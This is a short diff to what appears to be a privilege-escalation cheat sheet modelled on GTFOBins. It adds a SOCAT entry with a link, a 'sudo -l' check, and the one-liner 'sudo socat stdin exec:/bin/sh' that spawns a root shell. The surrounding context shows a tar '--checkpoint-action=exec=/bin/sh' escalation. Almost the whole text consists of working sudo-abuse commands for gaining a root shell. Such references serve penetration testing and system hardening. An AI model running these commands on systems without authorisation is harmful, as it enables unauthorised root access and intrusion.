@@ -49,3 +49,16 @@ User ??? may run the following commands on ???:
 ```    
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
+
+# SOCAT
+https://gtfobins.github.io/gtfobins/socat/#sudo
+```
+sudo -l
+```
+If:
+/usr/bin/socat
+
+```    
+sudo socat stdin exec:/bin/sh
+```
+
